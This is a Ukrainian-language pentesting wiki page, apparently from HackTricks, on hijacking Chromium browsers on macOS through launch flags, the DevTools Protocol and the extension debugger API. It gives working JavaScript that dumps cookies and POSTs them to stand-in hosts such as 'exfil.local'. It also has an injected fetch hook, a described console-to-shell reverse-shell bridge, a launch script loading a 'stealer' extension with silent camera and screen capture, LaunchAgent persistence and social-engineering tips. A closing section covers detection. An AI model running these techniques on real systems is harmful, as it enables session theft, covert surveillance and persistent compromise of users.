# Ін’єкція Chromium у macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Браузери на основі Chromium, зокрема Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi та Opera, використовують однакові перемикачі командного рядка, файли налаштувань та інтерфейси автоматизації DevTools. У macOS будь-який користувач із доступом до GUI може завершити наявний сеанс браузера й повторно запустити його з довільними flags, extensions або DevTools endpoints, які працюватимуть із entitlements цільового користувача.

#### Запуск Chromium із власними flags у macOS

macOS підтримує лише один UI-екземпляр для кожного профілю Chromium, тому для instrumentation зазвичай потрібно примусово закрити браузер (наприклад, за допомогою `osascript -e 'tell application "Google Chrome" to quit'`). Attackers зазвичай повторно запускають його через `open -na "Google Chrome" --args <flags>`, щоб інжектити аргументи без модифікації app bundle. Обгортання цієї команди в користувацький LaunchAgent (`~/Library/LaunchAgents/*.plist`) або login hook гарантує, що tampered browser буде повторно запущено після reboot/logoff.

#### Flag `--load-extension`

Flag `--load-extension` автоматично завантажує unpacked extensions (шляхи, розділені комами). Поєднайте його з `--disable-extensions-except`, щоб заблокувати legitimate extensions і примусово запускати лише ваш payload. Malicious extensions можуть запитувати high-impact permissions, як-от `debugger`, `webRequest` і `cookies`, щоб отримати доступ до DevTools protocols, змінювати CSP headers, downgrade HTTPS або exfiltrate session material одразу після запуску браузера.

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Ці перемикачі відкривають Chrome DevTools Protocol (CDP) через TCP або pipe, щоб external tooling могло керувати браузером. Google зафіксувала широкомасштабне infostealer abuse цього інтерфейсу, і починаючи з Chrome 136 (березень 2025 року) ці перемикачі ігноруються для default profile, якщо браузер не запущено з нестандартним `--user-data-dir`. Це забезпечує App-Bound Encryption у реальних профілях, однак attackers усе ще можуть створити fresh profile, змусити victim автентифікуватися в ньому (за допомогою phishing/triage assistance) і збирати cookies, tokens, device trust states або WebAuthn registrations через CDP.

#### Flag `--user-data-dir`

Цей flag перенаправляє весь browser profile (History, Cookies, Login Data, Preference files тощо) до шляху, контрольованого attacker. Він обов’язковий під час поєднання сучасних Chrome builds із `--remote-debugging-port`, а також ізолює tampered profile, щоб можна було розмістити попередньо заповнені файли `Preferences` або `Secure Preferences`, які вимикають security prompts, автоматично встановлюють extensions і змінюють default schemes.

#### Flag `--use-fake-ui-for-media-stream`

Цей перемикач обходить permission prompt для camera/mic, тому будь-яка сторінка, яка викликає `getUserMedia`, негайно отримує доступ. Поєднайте його з flags на кшталт `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` або командами CDP `Browser.grantPermissions`, щоб безшумно записувати audio/video, ділитися екраном або проходити WebRTC permission checks без взаємодії з користувачем.

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse зазвичай є стадією **post-exploitation**, а не початковим payload. Нещодавня кампанія macOS, націлена на developers, використовувала poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`), тому code виконувався лише тоді, коли victim **збирав** project, а не просто clone або open його. Після першого виконання malware також інфікував інші дерева `.xcodeproj`, додавав malicious Git `pre-commit` hooks і шукав додаткові Xcode projects у ZIP archives.

Для Chromium abuse це важливо, оскільки attacker не потрібно patch-ити сам browser binary. Натомість short-lived build-phase / `osascript` stager може встановити **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher тощо), який щоразу повторно відкриває legitimate browser із flags, контрольованими attacker, коли користувач його запускає.

> [!TIP]
> На developer endpoints перевіряйте файли `.pbxproj`, `.git/hooks/pre-commit` і ZIPs, що містять `.xcodeproj`, на наявність неочікуваних `curl`, `osascript`, `xxd`, вкладеного `base64` або логіки повторного запуску Chrome.

## Remote Debugging & DevTools Protocol Abuse

Після повторного запуску Chrome з окремими `--user-data-dir` і `--remote-debugging-port` можна під’єднатися через CDP (наприклад, за допомогою `chrome-remote-interface`, `puppeteer` або `playwright`) і запрограмувати workflows із високими привілеями:

- **Крадіжка cookies/session:** `Network.getAllCookies` і `Storage.getCookies` повертають HttpOnly values, навіть коли App-Bound encryption зазвичай блокувала б доступ до filesystem, оскільки CDP просить запущений browser розшифрувати їх.
- **Маніпуляції permissions:** `Browser.grantPermissions` і `Emulation.setGeolocationOverride` дають змогу обходити prompts для camera/mic (особливо в поєднанні з `--use-fake-ui-for-media-stream`) або підробляти location-based security checks.
- **Інжекція keystrokes/scripts:** `Runtime.evaluate` виконує довільний JavaScript в active tab, що дає змогу викрадати credentials, змінювати DOM або інжектити persistence beacons, які зберігаються після navigation.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` і `Fetch.enable` перехоплюють authenticated requests/responses у реальному часі, не залишаючи disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Оскільки Chrome 136 блокує CDP у профілі за замовчуванням, копіювання наявного каталогу `~/Library/Application Support/Google/Chrome` жертви до staging-шляху більше не дає змоги отримати розшифровані cookies. Натомість змусьте користувача пройти автентифікацію в instrumented profile за допомогою social-engineering (наприклад, під виглядом «корисної» support-сесії) або перехоплюйте MFA-токени під час передавання через CDP-керовані network hooks.

### XCSSET-style CDP Backdoor Chain

Практичний malware-патерн:

1. Перезапускайте userland implant або wrapper щоразу під час запуску Chrome.
2. Запускайте легітимний browser із `--remote-debugging-port=<port>` і, починаючи з Chrome 136, зазвичай із парним нестандартним `--user-data-dir=<dir>`.
3. Запускайте helper, який підключається до локального CDP WebSocket і реєструє pre-document hook за допомогою `Page.addScriptToEvaluateOnNewDocument`.

Такий helper може інжектити JavaScript **до** запуску site code, що ідеально підходить для hooking `window.fetch`, `XMLHttpRequest`, wallet providers або autofill flows без модифікації файлів на диску.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Потужніший варіант перетворює браузер на **міст команд хоста**: інжектований JavaScript виводить позначений роздільником `console.log`, локальний helper відстежує `Runtime.consoleAPICalled`, видаляє маркер, виконує решту через shell хоста (наприклад, `exec.Command` у Go) і повертає stdout/stderr через WebSocket атакувальника. Це перетворює виконання скриптів на рівні вкладки на переважно безфайлову reverse shell.

## Інжекція на основі Extension через Debugger API

Дослідження 2023 року "Chrowned by an Extension" продемонструвало, що malicious extension, який використовує API `chrome.debugger`, може підключитися до будь-якої вкладки й отримати ті самі можливості DevTools, що й `--remote-debugging-port`. Це руйнує початкові припущення щодо ізоляції (extensions залишаються у власному контексті) і дає змогу:

- Тихо викрадати cookies і credentials за допомогою `Network.getAllCookies`/`Fetch.getResponseBody`.
- Змінювати дозволи сайтів (камера, мікрофон, геолокація) і обходити security interstitial, що дає phishing-сторінкам змогу імітувати діалоги Chrome.
- Виконувати on-path tampering попереджень TLS, завантажень або запитів WebAuthn, програмно керуючи `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` або `Security.handleCertificateError`.

Завантажте extension за допомогою `--load-extension`/`--disable-extensions-except`, щоб не вимагати взаємодії з користувачем. Мінімальний background script, який weaponizes API, виглядає так:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Розширення також може підписуватися на події `Debugger.paused`, щоб читати змінні JavaScript, змінювати inline-скрипти або встановлювати користувацькі точки зупинки, які зберігаються після навігації. Оскільки все виконується в межах GUI-сесії користувача, Gatekeeper і TCC не активуються, що робить цю техніку ідеальною для malware, яке вже отримало виконання в контексті користувача.

## Виявлення та пошук

- Створюйте сповіщення про запуск Chromium-браузерів із `--remote-debugging-port`, `--remote-debugging-pipe` або підозрілим `--user-data-dir`, особливо якщо батьківським процесом є `bash`, `sh`, `osascript`, `xcodebuild` або helper LaunchAgent.
- Шукайте короткі ланцюжки, у яких helper відкриває локальний CDP WebSocket, реєструє `Page.addScriptToEvaluateOnNewDocument`, а потім встановлює довготривале вихідне WebSocket/HTTPS-з'єднання.
- Шукайте console-to-shell bridges, зіставляючи активність браузера `Runtime.consoleAPICalled` із дочірніми shell або helper-процесами, що виконують команди, надані attacker.
- На Mac розробників перевіряйте записи `PBXShellScriptBuildPhase` у `.pbxproj`, Git hooks `pre-commit`, relauncher-и Dock/login item і Xcode-проєкти, що містяться в ZIP-архівах, на предмет встановлення browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Інструменти

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Автоматизує запуск Chromium за допомогою payload extensions і надає інтерактивні CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Подібний інструмент, орієнтований на перехоплення трафіку та browser instrumentation для операторів macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Бібліотека Node.js для створення скриптів Chrome DevTools Protocol dumps (cookies, DOM, permissions), коли активний екземпляр із `--remote-debugging-port`.

### Приклад
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Знайдіть більше прикладів у посиланнях на tools.

## Посилання

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
